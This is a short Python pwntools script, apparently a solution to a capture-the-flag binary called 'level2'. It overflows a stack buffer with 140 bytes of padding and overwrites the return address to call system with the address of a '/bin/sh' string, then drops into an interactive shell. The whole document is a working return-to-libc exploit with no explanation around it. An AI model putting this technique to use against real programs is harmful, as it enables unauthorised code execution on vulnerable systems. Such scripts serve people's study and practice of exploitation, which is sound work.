from pwn import *
io = process('./level2')
bin_sh = 0x804A024 
sys_call =0x8048320
payload = b'a'*(136+4)+p32(sys_call)+p32(0xdeedbeef)+p32(bin_sh)
io.sendline(payload)
io.interactive()
